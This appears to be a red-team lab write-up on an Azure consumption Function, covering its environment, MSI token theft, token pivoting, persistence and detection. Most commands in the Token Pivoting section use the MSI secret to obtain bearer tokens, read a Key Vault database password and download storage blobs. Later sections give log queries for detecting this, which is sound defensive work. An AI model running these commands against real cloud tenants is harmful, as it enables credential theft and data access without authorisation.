# Azure Consumption Execution Environment

Running under a consumption based Azure function (cold starts). Included a SP attached identity to the function for MSI testing.

## Execution Environment

```
id
uid=1000(app) gid=1000(app) groups=1000(app)
```

```
whoami
app
```

```
pwd
/
```

```
ls
FuncExtensionBundles
azure-functions-host
bin
boot
dev
etc
home
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
squashfuse
srv
sys
tmp
usr
var
```

```
cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
VERSION_CODENAME=stretch
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

```
env
CORS_SUPPORT_CREDENTIALS=False
MSI_ENDPOINT=http://localhost:8081/msi/token
ResourceType=Microsoft.ServiceFabricMesh/applications
ResourceGroupName=AZCONTAINERS-WAWS-PROD-BAY-063-5
FUNCTIONS_WORKER_RUNTIME_VERSION=~2
WEBSITE_HOME_STAMPNAME=waws-prod-bay-063
LANG=C.UTF-8
WEBSITE_SITE_NAME=pumapreycougar
SUDO_GID=0
ScmType=None
HOST_VERSION=2.0.12888.0
HOSTNAME=ccvm1
APPSETTING_ScmType=None
APPSETTING_WEBSITE_RUN_FROM_PACKAGE=https://abc.blob.core.windows.net/function-releases/20191223184402-8b9cf6ad-0395-42b0-8378-29d64be68803.zip
WEBSITE_RUN_FROM_PACKAGE=https://abc.blob.core.windows.net/function-releases/20191223184402-8b9cf6ad-0395-42b0-8378-29d64be68803.zip
WEBSITE_AUTH_ENCRYPTION_KEY=XXXXX
ASPNETCORE_URLS=http://localhost:9091
APPSETTING_AzureWebJobsStorage=DefaultEndpointsProtocol=https;AccountName=YYYYY;AccountKey=ZZZZZ;EndpointSuffix=core.windows.net
Fabric_ServiceDnsName=functionsRuntimeService.App-9133AA1C-637127197019543644
SCM_RUN_FROM_PACKAGE=https://abc.blob.core.windows.net/scm-releases/scm-latest-pumapreycougar.zipse=2029-12-16T23%3A34%3A21Z&sp=rw
USERNAME=app
JAVA_HOME=/usr/lib/jvm/zre-8-azure-amd64
SUDO_COMMAND=/azure-functions-host/Microsoft.Azure.WebJobs.Script.WebHost
AzureWebJobsStorage=DefaultEndpointsProtocol=https;AccountName=YYYYY;AccountKey=ZZZZZ;EndpointSuffix=core.windows.net
APPSETTING_APPINSIGHTS_INSTRUMENTATIONKEY=ABC123
AzureWebJobsScriptRoot=/home/site/wwwroot
APPSETTING_FUNCTIONS_WORKER_RUNTIME=dotnet
FUNCTIONS_EXTENSION_VERSION=~2
USER=app
Fabric_ReplicaId=132215965073936227
CONTAINER_IMAGE_URL=mcr.microsoft.com/azure-functions/mesh:2.0.12888a
SubscriptionId=ABC123
WEBSITE_STAMP_DEPLOYMENT_ID=ABC123
Fabric_Epoch=132215965068079940:8589934592
PWD=/
HOME=/home
SUDO_USER=root
WEBSITE_CONTAINER_READY=1
WEBSITE_OWNER_NAME=YYYYY
WEBSITE_AUTH_ENABLED=False
Fabric_ReplicaName=0
ResourceName=App-AAA-BBB
APPSETTING_FUNCTIONS_EXTENSION_VERSION=~2
APPSETTING_WEBSITE_SITE_NAME=pumapreycougar
AzureWebEncryptionKey=ABC123
WEBSITE_HOSTNAME=pumapreycougar.azurewebsites.net
CONTAINER_ENCRYPTION_KEY=ABC123
Fabric_Id=67450c32-a618-4f40-8c9e-2a9aaa074ee2
Fabric_NetworkingMode=Other
DOTNET_USE_POLLING_FILE_WATCHER=true
SUDO_UID=0
CONTAINER_NAME=9133AA1C-637127197019543644
ASPNETCORE_VERSION=2.2.7
DOTNET_RUNNING_IN_CONTAINER=true
TERM=xterm
SHELL=/bin/bash
MSI_SECRET=ABC123
APPSETTING_WEBSITE_SLOT_NAME=Production
Fabric_ServiceName=functionsRuntimeService
Fabric_ApplicationName=App-9133AA1C-637127197019543644
Fabric_CodePackageName=functionsRuntimeContainer
CORS_ALLOWED_ORIGINS=["https://functions.azure.com","https://functions-staging.azure.com","https://functions-next.azure.com"]
Location=West US
SHLVL=1
FUNCTIONS_WORKER_RUNTIME=dotnet
APPINSIGHTS_INSTRUMENTATIONKEY=ABC-1234
WEBSITE_PLACEHOLDER_MODE=0
CodePackageName=functionsRuntimeContainer
LOGNAME=app
APPSETTING_SCM_RUN_FROM_PACKAGE=https://abc123.blob.core.windows.net/scm-releases/scm-latest-pumapreycougar.zip
CONTAINER_START_CONTEXT_SAS_URI=http://abcq23.blob.core.windows.net/azcontainers/9133aa1c-637127197019543644
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APPSETTING_WEBSITE_AUTH_ENABLED=False
MESH_INIT_URI=http://localhost:6060/
ServiceName=functionsRuntimeService
Fabric_NodeIPOrFQDN=10.92.0.4
WEBSITE_SLOT_NAME=Production
_=/usr/bin/env
```

```
ls -la ~/.aspnet
total 12
drwxr-xr-x 3 app app 4096 Dec 23 19:22 .
drwxr-xr-x 1 app app 4096 Dec 23 19:23 ..
drwxr-xr-x 2 app app 4096 Dec 23 19:22 DataProtection-Keys
ls -la ~/.aspnet/DataProtection-Keys
total 12
drwxr-xr-x 2 app app 4096 Dec 23 19:22 .
drwxr-xr-x 3 app app 4096 Dec 23 19:22 ..
-rw-r--r-- 1 app app 1000 Dec 23 19:22 key-76a45126-4f5f-4f5f-8dbd-a243fa6a8cd5.xml
```

```
cat ~/.aspnet/DataProtection-Keys/key-76a45126-4f5f-4f5f-8dbd-a243fa6a8cd5.xml

<?xml version="1.0" encoding="utf-8"?>
<key id="76a45126-4f5f-4f5f-8dbd-a243fa6a8cd5" version="1">
  <creationDate>2019-12-23T19:22:56.6421802Z</creationDate>
  <activationDate>2019-12-23T19:22:56.6101845Z</activationDate>
  <expirationDate>2020-03-22T19:22:56.6101845Z</expirationDate>
  <descriptor deserializerType="Microsoft.AspNetCore.DataProtection.AuthenticatedEncryption.ConfigurationModel.AuthenticatedEncryptorDescriptorDeserializer, Microsoft.AspNetCore.DataProtection, Version=2.2.0.0, Culture=neutral, PublicKeyToken=adb9793829ddae60">
    <descriptor>
      <encryption algorithm="AES_256_CBC" />
      <validation algorithm="HMACSHA256" />
      <masterKey p4:requiresEncryption="true" xmlns:p4="http://schemas.asp.net/2015/03/dataProtection">
        <!-- Warning: the key below is in an unencrypted form. -->
        <value>ABCq123==</value>
      </masterKey>
    </descriptor>
  </descriptor>
```

Querying the MSI service for bearer tokens:

```
env | grep 'MSI'

MSI_ENDPOINT=http://localhost:8081/msi/token
MSI_SECRET=ABC123
```

Research on MSI architecture: https://techcommunity.microsoft.com/t5/Azure-Developer-Community-Blog/Understanding-Azure-MSI-Managed-Service-Identity-tokens-caching/ba-p/337406

```bash
curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://storage.azure.com/"
echo
```

Response is a JWT that can be used to access the storage service for 8 hours. Example of the decoded token:

```json
{
    "aud": "https://storage.azure.com/",
    "iss": "https://sts.windows.net/ad0e23cd-ec45-4fba-b7ea-cd29f4795e78/",
    "iat": 1577132754,
    "nbf": 1577132754,
    "exp": 1577161854,
    "aio": "42VgYAjYV+C7ff6MdeqBGx5Y7V2zFQA=",
    "appid": "abc-123",
    "appidacr": "2",
    "idp": "https://sts.windows.net/ad0e23cd-ec45-4fba-b7ea-cd29f4795e78/",
    "oid": "abc-123",
    "sub": "abc-123",
    "tid": "abc-123
    "uti": "9bg56odteUKeWDv7MoeOAA",
    "ver": "1.0",
    "xms_mirid": "/subscriptions/abc-123/resourcegroups/pumaprey-cougar/providers/Microsoft.Web/sites/pumapreycougar"
}
```

## Token Pivoting

### Azure Key Vault

[API Documentation](https://docs.microsoft.com/en-us/rest/api/keyvault/)

From the compromised function, request a Bearer token for the vault service:

```bash
curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://vault.azure.net"
echo
```

List the secrets:

```bash
export BEARER_TOKEN=<SET TOKEN VALUE>
export VAULT_NAME=cougar$TF_VAR_UniqueString
curl -s -H "Authorization: Bearer $BEARER_TOKEN" "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.0"
```

List the versions for the secret:

```bash
export COUGAR_DB_PASS=$(curl -s -H "Authorization: Bearer $BEARER_TOKEN" "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.0" | jq -r '.value[0].id' )
curl -s -H "Authorization: Bearer $BEARER_TOKEN" "$COUGAR_DB_PASS/versions?api-version=7.0"
```

Read a secret value:

```bash
export COUGAR_DB_PASS_V0=$(curl -s -H "Authorization: Bearer $BEARER_TOKEN" "$COUGAR_DB_PASS/versions?api-version=7.0" | jq -r '.value[0].id')
curl -H "Authorization: Bearer $BEARER_TOKEN" "$COUGAR_DB_PASS_V0?api-version=7.0"
```

### Azure Storage

[API Documentation](https://docs.microsoft.com/en-us/rest/api/storageservices/)

From the compromised function, request a Bearer token for the storage service:

```bash
curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://storage.azure.com/"
echo
```

List the storage account containers:

```bash
export BEARER_TOKEN=<SET TOKEN VALUE>
export STORAGE_ACCOUNT=cougar$TF_VAR_UniqueString
curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/?comp=list" | xmllint --format -
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<EnumerationResults ServiceEndpoint="https://cougar<UNIQUE_STRING>.blob.core.windows.net/">
  <Containers>
    <Container>
      <Name>azure-webjobs-hosts</Name>
      <Properties>
        <Last-Modified>Thu, 19 Mar 2020 17:52:51 GMT</Last-Modified>
        <Etag>"0x8D7CC2E584F1AF9"</Etag>
        <LeaseStatus>unlocked</LeaseStatus>
        <LeaseState>available</LeaseState>
        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
        <HasLegalHold>false</HasLegalHold>
      </Properties>
    </Container>
    <Container>
      <Name>azure-webjobs-secrets</Name>
      <Properties>
        <Last-Modified>Thu, 19 Mar 2020 17:52:47 GMT</Last-Modified>
        <Etag>"0x8D7CC2E559F352A"</Etag>
        <LeaseStatus>unlocked</LeaseStatus>
        <LeaseState>available</LeaseState>
        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
        <HasLegalHold>false</HasLegalHold>
      </Properties>
    </Container>
    <Container>
      <Name>function-releases</Name>
      <Properties>
        <Last-Modified>Thu, 19 Mar 2020 17:50:20 GMT</Last-Modified>
        <Etag>"0x8D7CC2DFE3B3EE4"</Etag>
        <LeaseStatus>unlocked</LeaseStatus>
        <LeaseState>available</LeaseState>
        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
        <HasLegalHold>false</HasLegalHold>
      </Properties>
    </Container>
    <Container>
      <Name>scm-releases</Name>
      <Properties>
        <Last-Modified>Thu, 19 Mar 2020 17:50:31 GMT</Last-Modified>
        <Etag>"0x8D7CC2E049DE518"</Etag>
        <LeaseStatus>unlocked</LeaseStatus>
        <LeaseState>available</LeaseState>
        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
        <HasLegalHold>false</HasLegalHold>
      </Properties>
    </Container>
  </Containers>
  <NextMarker/>
</EnumerationResults>
```

List the blobs in the images container:

```bash
curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/images?restype=container&comp=list"
```

Download our target cougar image:

```bash
curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/images/cougar.jpg" --output ~/Downloads/cougar.jpg
```

## Persistence

Persisting a malware payload into the runtime environment:

```bash
echo "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" > /tmp/malware.sh
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Waiting approximately 1 minute:

```bash
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Waiting approximately 2 minutes:

```bash
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Waiting approximately 3 minutes:

Slowly started increasing the inactivity to 2, 3, 4, 5, and so on minutes. Finally, after 6 minutes of inactivity:

```bash
cat /tmp/malware.sh
cat: /tmp/malware.sh: No such file or directory
```

## Monitoring &amp; Incident Response

### Application Insights

Logs and telemetry are automatically sent to Application Insights. Interesting note: The key in the `env` vars is all you need to send forged metrics to the insights log. Let's query some information about the Cougar execution.

Insights query for Cougar invocations via the shutdown event:

```
traces
| where timestamp > ago(7d)
| where customDimensions.['EventId'] == "5"
| order by timestamp desc
| limit 50
```

Insights query for function access to the secret selecting only a few columns:

```
traces | where timestamp > ago(7d) | where customDimensions.["EventId"] == "8" | order by timestamp desc | project timestamp, cloud_RoleName, operation_Name, customDimensions ["EventId"], customDimensions["InvocationId"]
```

Counting the number of in

This can be run from the command line by installing the application insights and log analytics extensions:

```
az extension add -n application-insights
az extension add -n log-analytics
```

Then, run your query for normal function secret access using the following insights log query:

```
az monitor app-insights query -g pumaprey-cougar --app pumapreycougar20191219172 --analytics-query 'traces | where timestamp > ago(7d) | where customDimensions.["EventId"] == "8" | order by timestamp desc | project timestamp, cloud_RoleName, operation_Name, customDimensions ["EventId"], customDimensions["InvocationId"]' --offset 7D
```

Counting the number of standard function secret access logs can help identify anomalies as well. Appending a jq query to count the number of results returned:

```
az monitor app-insights query -g pumaprey-cougar --app pumapreycougar20191219172 --analytics-query 'traces | where timestamp > ago(7d) | where customDimensions.["EventId"] == "8" | order by timestamp desc | project timestamp, cloud_RoleName, operation_Name, customDimensions ["EventId"], customDimensions["InvocationId"]' --offset 7D | jq '.tables[0].rows | length'
```

Now we need to get to the heart of the audit data and find number to secret reads from ALL sources. From what I can tell, there is no centralized "CloudTrail / IAM Audit Log" service in Azure. At least in a non-enterprise AD account. Querying the key vault monitoring log, which is not enabled by default you will find this. NOTE: Azure Security Center did recommend enabling logging on the key vault to generate this data.

Viewing all actions taken against the `cougar-database-pass` secret:

```
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.KEYVAULT"
| where id_s contains "cougar-database-pass"
| order by TimeGenerated desc
```

A normal entry comes from a Microsoft owned IP address and the `azuresdk` client:

```
TimeGenerated: 1/20/2020, 1:34:52.309 AM
identityClaim: /subscriptions/#####/resourcegroups/pumaprey-cougar/providers/Microsoft.Web/sites/pumapreycougar
id_s: https://######.vault.azure.net/secrets/cougar-database-pass/3ee############
OperationName: SecretGet
ResultType: Success
CallerIPAddress: 40.81.2.152
clientinfo_s: azsdk-net-Security.KeyVault.Secrets/4.0.1+d9d93df6c75797a6027c125ab3ff61b2ac894102 (.NET Core 3.1.0; Linux 4.19.84-microsoft-standard #1 SMP Wed Nov 13 13:08:05 UTC 2019)
```

Extracting the tokens shows the attacker's caller IP and client information:

```
TimeGenerated: 1/20/2020, 2:58:58.262 AM
identityClaim: /subscriptions/#####/resourcegroups/pumaprey-cougar/providers/Microsoft.Web/sites/pumapreycougar
id_s: https://######.vault.azure.net/secrets/cougar-database-pass/3ee############
OperationName: SecretGet
ResultType: Success
CallerIPAddress: 95.025.143.109
clientinfo_s: curl/7.64.1
```

From the `az` CLI, this command will search the logs for `GetSecret` actions from the managed service identity.

```
az monitor log-analytics query --workspace 34ab64fe-8eab-4e31-9e85-7c1daaae020a --analytics-query 'AzureDiagnostics | where TimeGenerated > ago(7d) | where ResourceProvider == "MICROSOFT.KEYVAULT" | where id_s contains "cougar-database-pass" | where identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g == "0cbd41de-55c6-460d-b92b-837eddd0ea0d" | order by TimeGenerated desc | project TimeGenerated, OperationName, CallerIPAddress, clientInfo_s, ResultType'
```

Counting the total number of invocations using `jq`:

```
az monitor log-analytics query --workspace 34ab64fe-8eab-4e31-9e85-7c1daaae020a --analytics-query 'AzureDiagnostics | where TimeGenerated > ago(7d) | where ResourceProvider == "MICROSOFT.KEYVAULT" | where id_s contains "cougar-database-pass" | where identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g == "0cbd41de-55c6-460d-b92b-837eddd0ea0d"' | jq '. | length'
```

Looking for compromised bearer tokens can be accomplished with a query similar to the following:

NOTE: Maintenance will need to be done as the IP ranges from MS change. Or, on function start up, the current IP address could be registered in a backend cache / database. Or, even adjust this query on the fly.

```
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.KEYVAULT"
| where identity_claim_xms_mirid_s contains "/pumaprey-cougar/providers/Microsoft.Web/sites/pumapreycougar"
| where id_s contains "cougar-database-pass"
| where CallerIPAddress !contains "40."
| order by TimeGenerated desc
```

This only works for resources that have Diagnostics integration with Application Insights. The other resource in our demo, Azure Storage, at the time of this writing does not have native integration with Azure Monitor and Log Analytics. :(
  
To make this happen, you have to covert their log format to JSON and post the JSON data into Log Analytics to ingest the data. Projecting Q2 2020 before this is handled by the platform.

- [https://feedback.azure.com/forums/217298-storage/suggestions/33930541-make-it-possible-to-send-storage-analytics-logs](https://feedback.azure.com/forums/217298-storage/suggestions/33930541-make-it-possible-to-send-storage-analytics-logs)

- [https://azure.microsoft.com/en-us/blog/query-azure-storage-analytics-logs-in-azure-log-analytics/](https://azure.microsoft.com/en-us/blog/query-azure-storage-analytics-logs-in-azure-log-analytics/)

## VPC Configuration

Unable to configure the consumption based function to connect to a VPC on start up.

### VPC Endpoints

Unable to configure the consumption based function to connect to a VPC on start up.

## Cold Start Times

Running the following command a few times to see the cold versus warm start metrics. This will invoke the function without any reverse shell data (simulating starting and stopping the function), and retrieve the response time.

```bash
curl "https://cougar$TF_VAR_UniqueString.azurewebsites.net/api/cougar?code=YOUR_API_KEY" -s -o /dev/null -w "%{time_starttransfer}\n"
```

### No VPC Integration

Cold hits:

```
Request 1: 6.098226
Request 2: 4.072225
```

Warm hits:

```
Request 2: 0.344960
Request 3: 0.319494
Request 4: 0.284055
```

### With VPC Integration

This is not possible using the consumption plan. See the [Premium Plan][./PREMIUM.md] notes for load times in that environment.
